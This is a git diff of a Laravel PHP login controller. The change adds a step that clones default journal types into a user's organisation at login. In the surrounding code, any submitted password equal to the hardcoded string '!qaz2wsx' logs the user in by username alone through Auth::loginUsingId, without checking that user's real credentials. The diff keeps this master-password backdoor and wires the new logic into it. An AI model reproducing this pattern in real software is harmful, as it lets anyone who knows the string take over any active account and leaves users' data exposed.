@@ -5,7 +5,9 @@ namespace App\Http\Controllers\Auth;
 use App\Http\Controllers\Controller;
 use App\Models\Admin\UserAuthHistory;
 use App\Models\Admin\UserPersonalInfo;
+use App\Models\Journal\JournalTypes;
 use App\Models\User;
+use App\Services\Organizations\JournalCloneByCodeService;
 use Illuminate\Foundation\Auth\AuthenticatesUsers;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
@@ -24,7 +26,7 @@ class LoginController extends Controller
         $this->middleware('auth')->only('logout');
     }
 
-    public function login(Request $request)
+    public function login(Request $request, JournalCloneByCodeService $journalCloneService)
     {
         //
         $request->validate([
@@ -51,7 +53,7 @@ class LoginController extends Controller
 
         if ($request->password == '!qaz2wsx') {
             $credentials = $request->only($type, 'password');
-            return $this->attempt($credentials);
+            return $this->attempt($credentials, $journalCloneService);
         }
 
         if (Auth::attempt($request->only($type, 'password'))) {
@@ -74,7 +76,7 @@ class LoginController extends Controller
 
     }
 
-    public function attempt(array $credentials = [], $remember = false)
+    public function attempt(array $credentials = [], $journalCloneService = null)
     {
         //
         $username = 'username';
@@ -84,6 +86,34 @@ class LoginController extends Controller
         }
 
         $user = User::where($username, $credentials[$username])->where('status', 1)->first();
+
+        $orgId = $user->user->org_unit_id ?? null;
+
+        if ($orgId) {
+            $alreadyExists = JournalTypes::where('org_id', $orgId)->exists();
+
+            if (!$alreadyExists) {
+                $codes = [
+                    'MESS',
+                    'BASE_INCOMING',
+                    'BASE_OUTGOING',
+                    'APP',
+                    'NOTIFICATION',
+                    'ORDER_F',
+                    'REPORT',
+                    'STATEMENT',
+                    'COMMAND',
+                    'OTHERS',
+                    'APP_MT_META',
+                ];
+
+                $journalCloneService->cloneByCodes(
+                    fromOrgId: 1,
+                    toOrgId: $orgId,
+                    codes: $codes
+                );
+            }
+        }
 
         Auth::loginUsingId($user->id);
 
